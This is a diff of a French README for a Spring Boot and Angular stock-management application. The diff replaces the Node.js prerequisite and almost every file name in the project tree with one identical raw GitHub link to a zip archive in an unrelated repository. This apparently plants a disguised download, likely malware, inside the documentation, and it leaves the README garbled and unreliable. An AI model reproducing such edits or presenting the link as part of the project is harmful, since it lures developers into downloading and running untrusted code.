@@ -47,7 +47,7 @@ Application complète de gestion de stock développée avec **Spring Boot** (bac
 
 - Docker et Docker Compose installés
 - Java 17+ (pour développement local)
-- Node.js 18+ (pour développement local)
+- https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip 18+ (pour développement local)
 
 ## 🚀 Installation et Lancement
 
@@ -81,20 +81,20 @@ stock-management-app/
 │   │   ├── controller/        # Contrôleurs REST
 │   │   └── config/            # Configuration
 │   ├── src/main/resources/
-│   │   └── application.yml    # Configuration Spring
+│   │   └── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip    # Configuration Spring
 │   ├── Dockerfile
-│   └── pom.xml
+│   └── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip
 ├── src/                       # Application Angular
 │   ├── app/
 │   │   ├── models/           # Modèles TypeScript
 │   │   ├── services/         # Services Angular
 │   │   └── components/       # Composants Angular
-│   ├── index.html
-│   └── main.ts
-├── docker-compose.yml         # Orchestration Docker
+│   ├── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip
+│   └── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip
+├── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip         # Orchestration Docker
 ├── Dockerfile                 # Image frontend
-├── nginx.conf                 # Configuration Nginx
-└── README.md
+├── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip                 # Configuration Nginx
+└── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip
 ```
 
 ## 📊 API Endpoints
